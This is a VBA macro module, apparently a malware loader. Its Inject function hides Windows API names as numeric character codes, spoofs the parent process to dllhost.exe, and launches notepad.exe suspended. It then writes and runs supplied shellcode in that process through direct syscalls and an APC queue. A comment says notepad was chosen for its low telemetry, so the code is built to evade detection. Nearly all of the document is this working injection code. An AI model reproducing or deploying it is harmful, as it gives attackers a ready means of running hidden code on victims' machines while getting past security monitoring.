Option Explicit

Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" ( _
    ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As LongPtr)

Private Const PROCESS_CREATE_PROCESS As Long = &H80
Private Const PROCESS_QUERY_LIMITED_INFORMATION As Long = &H1000

Public Function Inject(shellcode() As Byte) As Boolean
    Dim n As Long
    n = UBound(shellcode) - LBound(shellcode) + 1
    If n <= 0 Then Exit Function

    Dim hKernel As LongPtr
    hKernel = GetMod(MkStr(107,101,114,110,101,108,51,50,46,100,108,108))   ' kernel32.dll
    If hKernel = 0 Then Exit Function

    Dim pCreateProcess As LongPtr, pInitAttr As LongPtr, pUpdateAttr As LongPtr, pDeleteAttr As LongPtr
    pCreateProcess = GetProc(hKernel, MkStr(67,114,101,97,116,101,80,114,111,99,101,115,115,87))
    pInitAttr = GetProc(hKernel, MkStr(73,110,105,116,105,97,108,105,122,101,80,114,111,99,84,104,114,101,97,100,65,116,116,114,105,98,117,116,101,76,105,115,116))
    pUpdateAttr = GetProc(hKernel, MkStr(85,112,100,97,116,101,80,114,111,99,84,104,114,101,97,100,65,116,116,114,105,98,117,116,101))
    pDeleteAttr = GetProc(hKernel, MkStr(68,101,108,101,116,101,80,114,111,99,84,104,114,101,97,100,65,116,116,114,105,98,117,116,101,76,105,115,116))

    Dim pSnap As LongPtr, pP32First As LongPtr, pP32Next As LongPtr, pOpenProc As LongPtr, pCloseH As LongPtr
    pSnap = GetProc(hKernel, MkStr(67,114,101,97,116,101,84,111,111,108,104,101,108,112,51,50,83,110,97,112,115,104,111,116))
    pP32First = GetProc(hKernel, MkStr(80,114,111,99,101,115,115,51,50,70,105,114,115,116,87))
    pP32Next = GetProc(hKernel, MkStr(80,114,111,99,101,115,115,51,50,78,101,120,116,87))
    pOpenProc = GetProc(hKernel, MkStr(79,112,101,110,80,114,111,99,101,115,115))
    pCloseH = GetProc(hKernel, MkStr(67,108,111,115,101,72,97,110,100,108,101))

    If pCreateProcess = 0 Or pInitAttr = 0 Or pUpdateAttr = 0 Or pDeleteAttr = 0 _
        Or pSnap = 0 Or pP32First = 0 Or pP32Next = 0 Or pOpenProc = 0 Or pCloseH = 0 Then
        Exit Function
    End If

    Dim parentPid As Long
    parentPid = FindDllhostPid(pSnap, pP32First, pP32Next, pCloseH)
    If parentPid = 0 Then Exit Function

    Dim hParent As LongPtr
    hParent = Call3(pOpenProc, PROCESS_CREATE_PROCESS Or PROCESS_QUERY_LIMITED_INFORMATION, 0, parentPid)
    If hParent = 0 Then Exit Function

    Dim attrListSize As LongPtr
    Call4 pInitAttr, 0, 1, 0, VarPtr(attrListSize)
    If attrListSize = 0 Then GoTo Cleanup

    Dim attrList As LongPtr
    attrList = AllocRW(attrListSize)
    If attrList = 0 Then GoTo Cleanup

    Dim ok As Long
    ok = CLng(Call4(pInitAttr, attrList, 1, 0, VarPtr(attrListSize)))
    If ok = 0 Then GoTo Cleanup

    Dim hParentCopy As LongPtr
    hParentCopy = hParent
    ok = CLng(Call7(pUpdateAttr, attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, _
                    VarPtr(hParentCopy), LenB(hParentCopy), 0, 0))
    If ok = 0 Then GoTo Cleanup

    Dim si As STARTUPINFOEX
    si.StartupInfo.cb = LenB(si)
    si.lpAttributeList = attrList

    Dim pi As PROCESS_INFORMATION

    ' Target: notepad.exe (System32 path, signed Microsoft binary, modest telemetry footprint).
    Dim path As String
    path = MkStr(67,58,92,87,105,110,100,111,119,115,92,83,121,115,116,101,109,51,50,92,110,111,116,101,112,97,100,46,101,120,101)
    Dim wide() As Byte
    wide = ToUtf16(path)

    ok = CLng(Call10(pCreateProcess, _
        0, VarPtr(wide(0)), 0, 0, 0, _
        CREATE_SUSPENDED Or EXTENDED_STARTUPINFO_PRESENT, _
        0, 0, VarPtr(si), VarPtr(pi)))
    If ok = 0 Then GoTo Cleanup

    ' Allocate RW in remote
    Dim remoteAddr As LongPtr, remoteSize As LongPtr, status As Long
    remoteAddr = 0
    remoteSize = n
    status = CLng(SysCall6(MkStr(78,116,65,108,108,111,99,97,116,101,86,105,114,116,117,97,108,77,101,109,111,114,121), _
        pi.hProcess, VarPtr(remoteAddr), 0, VarPtr(remoteSize), MEM_COMMIT Or MEM_RESERVE, PAGE_READWRITE))
    If status <> STATUS_SUCCESS Then GoTo CleanupProc

    Dim written As LongPtr
    status = CLng(SysCall5(MkStr(78,116,87,114,105,116,101,86,105,114,116,117,97,108,77,101,109,111,114,121), _
        pi.hProcess, remoteAddr, VarPtr(shellcode(LBound(shellcode))), n, VarPtr(written)))
    If status <> STATUS_SUCCESS Then GoTo CleanupProc

    Dim protAddr As LongPtr, protSize As LongPtr, oldProt As Long
    protAddr = remoteAddr
    protSize = n
    status = CLng(SysCall5(MkStr(78,116,80,114,111,116,101,99,116,86,105,114,116,117,97,108,77,101,109,111,114,121), _
        pi.hProcess, VarPtr(protAddr), VarPtr(protSize), PAGE_EXECUTE_READ, VarPtr(oldProt)))
    If status <> STATUS_SUCCESS Then GoTo CleanupProc

    status = CLng(SysCall5(MkStr(78,116,81,117,101,117,101,65,112,99,84,104,114,101,97,100), _
        pi.hThread, remoteAddr, 0, 0, 0))
    If status <> STATUS_SUCCESS Then GoTo CleanupProc

    Dim prevCount As Long
    status = CLng(SysCall2(MkStr(78,116,82,101,115,117,109,101,84,104,114,101,97,100), _
        pi.hThread, VarPtr(prevCount)))
    If status <> STATUS_SUCCESS Then GoTo CleanupProc

    Inject = True

CleanupProc:
    If pi.hThread <> 0 Then Call1 pCloseH, pi.hThread
    If pi.hProcess <> 0 Then Call1 pCloseH, pi.hProcess
Cleanup:
    If pDeleteAttr <> 0 And attrList <> 0 Then Call1 pDeleteAttr, attrList
    If hParent <> 0 Then Call1 pCloseH, hParent
End Function

Private Function FindDllhostPid(pSnap As LongPtr, pFirst As LongPtr, pNext As LongPtr, pCloseH As LongPtr) As Long
    Dim snap As LongPtr
    snap = Call2(pSnap, TH32CS_SNAPPROCESS, 0)
    If snap = 0 Or snap = -1 Then Exit Function

    Dim pe As PROCESSENTRY32W
    pe.dwSize = LenB(pe)
    Dim ok As Long, target As String, hit As Long
    target = MkStr(100,108,108,104,111,115,116,46,101,120,101)   ' dllhost.exe

    ok = CLng(Call2(pFirst, snap, VarPtr(pe)))
    Do While ok <> 0
        If ProcessNameMatches(pe, target) Then
            hit = pe.th32ProcessID
            Exit Do
        End If
        pe.dwSize = LenB(pe)
        ok = CLng(Call2(pNext, snap, VarPtr(pe)))
    Loop

    Call1 pCloseH, snap
    FindDllhostPid = hit
End Function

Private Function ProcessNameMatches(pe As PROCESSENTRY32W, target As String) As Boolean
    Dim s As String, i As Long, b1 As Byte, b2 As Byte
    For i = 0 To UBound(pe.szExeFile) - 1 Step 2
        b1 = pe.szExeFile(i)
        b2 = pe.szExeFile(i + 1)
        If b1 = 0 And b2 = 0 Then Exit For
        s = s & ChrW$(CLng(b1) Or (CLng(b2) * &H100&))
    Next i
    ProcessNameMatches = (StrComp(s, target, vbTextCompare) = 0)
End Function

Private Function ToUtf16(s As String) As Byte()
    Dim n As Long, i As Long, out() As Byte
    n = Len(s)
    ReDim out(0 To n * 2 + 1) As Byte
    For i = 1 To n
        out((i - 1) * 2) = Asc(Mid$(s, i, 1)) And &HFF
        out((i - 1) * 2 + 1) = 0
    Next i
    out(n * 2) = 0
    out(n * 2 + 1) = 0
    ToUtf16 = out
End Function
